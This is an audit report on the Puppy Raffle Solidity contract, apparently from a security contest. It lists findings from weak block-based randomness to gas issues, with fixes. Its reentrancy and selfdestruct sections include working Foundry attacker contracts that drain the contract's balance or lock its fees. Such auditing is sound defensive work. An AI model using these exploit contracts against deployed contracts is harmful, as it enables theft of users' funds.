## Using block properties as a source of pseudorandomness can allow an attacker to manipulate the generated value.

### Severity

High risk

### Relevant GitHub Links

[https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L128-L129](https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L128-L129)

## Summary

The `PuppyRaffle::selectWinner` function to choose the winner generates a random number using the block data (`block.timestamp` and `block.difficulty`). This technique is not safe.

## Vulnerability Details

The `PuppyRaffle::selectWinner` function calculates the value of winnerIndex via `block.timestamp` and `block.difficulty`.

```solidity
function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
@>      uint256 winnerIndex =
@>          uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
```

The same method is also used to calculate the rarity of the NFT to be mined.

```solidity
        // We use a different RNG calculate from the winnerIndex to determine rarity
@>      uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
```

Using `block` data to generate random numbers in Solidity can be risky and potentially vulnerable to miner manipulation or front-running attacks. This is because the block value can be influenced or known by transaction participants.

## Impact

The impact is high because an attacker exploiting this vulnerability could win every match.

## Tools Used

- Foundry
- Manual check

## Recommendations

To generate random numbers more securely in Solidity, it is recommended that you use external entropy sources or trusted random number generation contracts, such as the Chainlink VRF random number generator.

---

## reentrancy vulnerability on refund

### Severity

High risk

### Relevant GitHub Links

[https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L96-L105](https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L96-L105)

## Summary

The `PuppyRaffle::refund` function is vulnerable to reentrancy attack. An attacker can empty the smart contract balance.

## Vulnerability Details

The `refund` function is vulnerable to reentrancy attack.

```solidity
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>      payable(msg.sender).sendValue(entranceFee);

@>      players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
```

The function sends the eth to the user and then changes the value of `players[playerIndex]` that is used before sending the eth to check whether or not to send it.
This means that if a call is made to the same function `refund`, before the status is changed, the eth will be sent again. Exploiting this vulnerability can empty the smart contract balance.

I create an attacker contract and a test to verify the vulnerability, follow these steps to test it:

- Put this file inside `src` folder, and rename it with `Attacker.sol`

<details>
<summary>Attacker code</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "./PuppyRaffle.sol";

contract Attacker {
    PuppyRaffle contractToAttack;

    constructor(address _raffle) {
        contractToAttack = PuppyRaffle(_raffle);
    }

    function Attack() public {
        console.log("Contract balance", address(contractToAttack).balance);

        // First step - the attacker enter in the raffle with his address
        address[] memory players = new address[](1);
        players[0] = address(this);
        contractToAttack.enterRaffle{value: 1 ether}(players);

        console.log(
            "Deposited 1 Ether, Contract balance",
            address(contractToAttack).balance
        );
        // Second step - The attacker calls the refund method
        contractToAttack.refund(0); // exploit here

        console.log("Attack contract balance", address(this).balance);
        console.log("Contract balance", address(contractToAttack).balance);
    }

    // The attacker use fallback function to exploit reentrancy
    receive() external payable {
        console.log("Attack contract balance", address(this).balance);
        console.log("Contract balance", address(contractToAttack).balance);
        if (address(contractToAttack).balance > 0 ether) {
            // Last step - when the attacker contract receive the amount refunded, he recalls the refund method
            // and he create a "loop" for empty the balance of the smart contract
            contractToAttack.refund(0); // exploit here
        }
    }
}
```

</details>

- Put this file inside `test` folder, and rename it with `ReEntrancyTest.t.sol`

<details>
<summary>Test code</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";
import {Attacker} from "../src/Attacker.sol";

contract ReEntrancyTest is Test {
    PuppyRaffle puppyRaffle;
    Attacker attacker;
    uint256 entranceFee = 1e18;
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
        attacker = new Attacker(address(puppyRaffle));
        vm.deal(address(puppyRaffle), 5 ether);
        vm.deal(address(attacker), 2 ether);
    }

    function testReentrancy() public {
        attacker.Attack();
        console.log("Final amount attacker", address(attacker).balance);
        console.log("Final amount contract", address(puppyRaffle).balance);
    }
}
```

</details>

- and run the command

```solidity
forge test -vvv --mc ReEntrancyTest
```

## Impact

This vulnerability permits to an attacker to empty the balance of the smart contract.

## Tools Used

- Foundry
- Manual review

## Recommendations

It is necessary to move the line that updates the status before making the `sendValue` call.

```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(
            playerAddress == msg.sender,
            "PuppyRaffle: Only the player can refund"
        );
        require(
            playerAddress != address(0),
            "PuppyRaffle: Player already refunded, or is not active"
        );

+       players[playerIndex] = address(0);

        payable(msg.sender).sendValue(entranceFee);

-       players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
```

---

## enterRaffle accepts Zero Address

### Severity

Medium risk

### Relevant GitHub Links

[https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L81-L83](https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L81-L83)

## Summary

The `PuppyRaffle::enterRaffle` function doesn't check if an entered address is equal to Zero Address. If the `PuppyRaffle::selectWinner` function chooses the Zero Address as winner, the transaction will revert.

## Vulnerability Details

The function `PuppyRaffle::enterRaffle` accepts as input an array of addresses, but it doesn't check if inside the array there is the Zero Address.

<details>
<summary>Code</summary>

```solidity
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
@>          players.push(newPlayers[i]);
        }

        // Check for duplicates
        for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
        emit RaffleEnter(newPlayers);
    }
```

</details>

If in the `PuppyRaffle::selectWinner` function, address Zero is chosen as the winner, `_safeMint(winner, tokenId);` will revert with the error `ERC721: mint to the zero address`.

It is possibile to check with this test, before run the test it is necessary to edit manually the smart contract to select the Zero Address as Winner, editing the row 157 inside `selectWinner` function.

```diff
-  address winner = players[winnerIndex];
+  address winner = players[0];
```

and run this test

<details>
<summary>Code</summary>

```solidity
function testCanAddZeroAddressToPlayersAndRevertSelectWinnerFunction() public {
        address[] memory players = new address[](4);
        players[0] = address(0);
        players[1] = playerOne;
        players[2] = playerTwo;
        players[3] = playerThree;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        assertEq(puppyRaffle.players(0), address(0));
        assertEq(puppyRaffle.players(1), playerOne);
        assertEq(puppyRaffle.players(2), playerTwo);
        assertEq(puppyRaffle.players(3), playerThree);

        uint256 expectedPrizeAmount = ((entranceFee * 4) * 20) / 100;

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        vm.expectRevert("ERC721: mint to the zero address");
        puppyRaffle.selectWinner();
    }
```

</details>

## Impact

The problem is not of a high level because it only occurs if the Zero address comes out as the winner. If this happens the transaction will fail and it will be enough to relaunch it (or it will be launched automatically n seconds later) and if a valid address is chosen the transaction will go to successful.

## Tools Used

- Foundry
- Manual check

## Recommendations

To fix the problem, just check that no address in the array is equal to Zero Address, and if not, do revert.

<details>
<summary>Code</summary>

```diff
function enterRaffle(address[] memory newPlayers) public payable {
        require(
            msg.value == entranceFee * newPlayers.length,
            "PuppyRaffle: Must send enough to enter raffle"
        );
        for (uint256 i = 0; i < newPlayers.length; i++) {
+           require(
+              newPlayers[i] != address(0),
+              "PuppyRaffle: Zero address cannot participate"
+           );
            players.push(newPlayers[i]);
        }

        // Check for duplicates
        for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(
                    players[i] != players[j],
                    "PuppyRaffle: Duplicate player"
                );
            }
        }
        emit RaffleEnter(newPlayers);
    }
```

</details>

---

## withdrawFees uses contract balance in a check

### Severity

Medium risk

### Relevant GitHub Links

[https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L158](https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L158)

## Summary

The `PuppyRaffle::withdrawFees` function uses the balance of the smart contract inside a require. An attacker can sending eth to the contract through a selfdestruct.

## Vulnerability Details

The `PuppyRaffle::withdrawFees` check if there are active players by checking the difference between the smart contract balance and the total fees.

```solidity
    function withdrawFees() external {
@>      require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }
```

An attacker can create a contract and send a smaller value to `entranceFee` via the `selfdestruct` function, thus blocking the contract and no longer being able to collect the fees.

I verify the vulnerability with a test:

- I created an attacker contract called `Attacker.sol` in `src` folder

<details>
<summary>Contract code</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "./PuppyRaffle.sol";

contract Attacker {
    PuppyRaffle contractToAttack;

    constructor(address _raffle) {
        contractToAttack = PuppyRaffle(_raffle);
    }

    function SelfDestructAttack() public {
        selfdestruct(payable(address(contractToAttack)));
    }
}
```

</details>

- I created a test called `SelfDestruct.t.sol` inside `test` folder, where I verify `withdrawFees` function works inside the `testWithdrawFees` test, and in the `testSelfDestruct` test I called `attacker.SelfDestructAttack();` before `withdrawFees` and check that the function reverts.

<details>
<summary>Test code</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";
import {Attacker} from "../src/Attacker.sol";

contract SelfDestructTest is Test {
    PuppyRaffle puppyRaffle;
    Attacker attacker;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
        attacker = new Attacker(address(puppyRaffle));
        vm.deal(address(attacker), 5 ether);
    }

    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }

    function testWithdrawFees() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPrizeAmount = ((entranceFee * 4) * 20) / 100;

        puppyRaffle.selectWinner();
        puppyRaffle.withdrawFees();
        assertEq(address(feeAddress).balance, expectedPrizeAmount);
    }

    function testSelfDestruct() public playersEntered {
        console.log("init", address(puppyRaffle).balance);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        attacker.SelfDestructAttack();

        console.log("after", address(puppyRaffle).balance);

        puppyRaffle.selectWinner();

        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
}
```

</details>

## Impact

In the event that ´entranceFee´ is for example `1 ether`, if the attacker adds `0.5 ether` to the balance of the contract with the `selfdestruct` function, the `withdrawFees` function will never allow the move the fees to the `feeAddress` address.

## Tools Used

- Foundry
- Manual review

## Recommendations

It is recommended not to use the smart contract balance, `address(this).balance` in this case, in the controls, but to use a dedicated variable.

---

## raffleDuration should be immutable

### Severity

Low risk

### Relevant GitHub Links

[https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L24](https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L24)

## Summary

The variable `PuppyRaffle::raffleDuration` should be immutable to consume less gas.

## Vulnerability Details

`PuppyRaffle::raffleDuration` is set by the constructor and is no longer modified, you can save gas by setting it as immutable.

```diff
    address[] public players;
-   uint256 public raffleDuration;
+   uint256 public immutable raffleDuration;
    uint256 public raffleStartTime;
    address public previousWinner;
```

## Impact

The impact is minimal, just more gas is consumed.

## Tools Used

Manual review

## Recommendations

Set the variable as immutable.

---

## imageUris should be constants

### Severity

Low risk

### Relevant GitHub Links

[https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L38](https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L38)

[https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L43](https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L43)

[https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L48](https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L48)

## Summary

`commonImageUri`, `rareImageUri` and `legendaryImageUri` should be set as constants.

## Vulnerability Details

`commonImageUri`, `rareImageUri` and `legendaryImageUri` are not updated following deployment should be declared constant to save gas.

```diff
    // Stats for the common puppy (pug)
-   string private commonImageUri = "ipfs://QmSsYRx3LpDAb1GZQm7zZ1AuHZjfbPkD6J7s9r41xu1mf8";
+   string private constant commonImageUri = "ipfs://QmSsYRx3LpDAb1GZQm7zZ1AuHZjfbPkD6J7s9r41xu1mf8";
    uint256 public constant COMMON_RARITY = 70;
    string private constant COMMON = "common";

    // Stats for the rare puppy (st. bernard)
-   string private rareImageUri = "ipfs://QmUPjADFGEKmfohdTaNcWhp7VGk26h5jXDA7v3VtTnTLcW";
+   string private constant rareImageUri = "ipfs://QmUPjADFGEKmfohdTaNcWhp7VGk26h5jXDA7v3VtTnTLcW";
    uint256 public constant RARE_RARITY = 25;
    string private constant RARE = "rare";

    // Stats for the legendary puppy (shiba inu)
-   string private legendaryImageUri = "ipfs://QmYx6GsYAKnNzZ9A6NvEKV9nf1VaDzJrqDR23Y8YSkebLU";
+   string private constant legendaryImageUri = "ipfs://QmYx6GsYAKnNzZ9A6NvEKV9nf1VaDzJrqDR23Y8YSkebLU";
    uint256 public constant LEGENDARY_RARITY = 5;
    string private constant LEGENDARY = "legendary";
```

## Impact

The impact is low, more gas is just consumed.

## Tools Used

Manual review

## Recommendations

Add `constant` to save gas.

---

## \_isActivePlayer function is not used

### Severity

Low risk

### Relevant GitHub Links

[https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L173-L180](https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L173-L180)

## Summary

The internal function `_isActivePlayer` is not used in the smart contract.

## Vulnerability Details

```solidity
    /// @notice this function will return true if the msg.sender is an active player
    function _isActivePlayer() internal view returns (bool) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == msg.sender) {
                return true;
            }
        }
        return false;
    }
```

The function `_isActivePlayer` is internal and can only be used by the contract itself, but is not used.
It can be removed to reduce gas consumption and to avoid creating confusion by leaving functions unused.

## Impact

The impact is low, deployment only consumes more gas and it can be confusing to find a function that is not used.

## Tools Used

Manual review

## Recommendations

Remove the unused function.

---

## missing Zero Address validation on feeAddress

### Severity

Low risk

### Relevant GitHub Links

[https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L62](https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L62)

[https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L168](https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L168)

## Summary

The constructor does not check that the `_feeAddress` passed as argument is different from the Zero Address.
The same problem also exists in the `changeFeeAddress` function.

## Vulnerability Details

In the constructor is it possible to set feeAddress as the Zero Address.

```solidity
    constructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) ERC721("Puppy Raffle", "PR") {
        entranceFee = _entranceFee;
@>      feeAddress = _feeAddress;
        raffleDuration = _raffleDuration;
        raffleStartTime = block.timestamp;

        rarityToUri[COMMON_RARITY] = commonImageUri;
        rarityToUri[RARE_RARITY] = rareImageUri;
        rarityToUri[LEGENDARY_RARITY] = legendaryImageUri;

        rarityToName[COMMON_RARITY] = COMMON;
        rarityToName[RARE_RARITY] = RARE;
        rarityToName[LEGENDARY_RARITY] = LEGENDARY;
    }
```

The same can be done in the function `changeFeeAddress`.

```solidity
    function changeFeeAddress(address newFeeAddress) external onlyOwner {
        feeAddress = newFeeAddress;
        emit FeeAddressChanged(newFeeAddress);
    }
```

In both cases you can fix the problem by adding a simple control.

```diff
    constructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) ERC721("Puppy Raffle", "PR") {
        entranceFee = _entranceFee;
+       require(_feeAddress != address(0), "No Zero Address");
        feeAddress = _feeAddress;
        raffleDuration = _raffleDuration;

...

    function changeFeeAddress(address newFeeAddress) external onlyOwner {
+       require(newFeeAddress != address(0), "No Zero Address");
        feeAddress = newFeeAddress;
        emit FeeAddressChanged(newFeeAddress);
    }

```

## Impact

Setting the `feeAddress` to `address(0)` will result in a loss of funds when calling the `withdrawFees` function.
The impact is low because if you insert the zero address you can change it.

## Tools Used

Manual review.

## Recommendations

Add a check to verify that the address passed as an argument is different from `address(0)`.
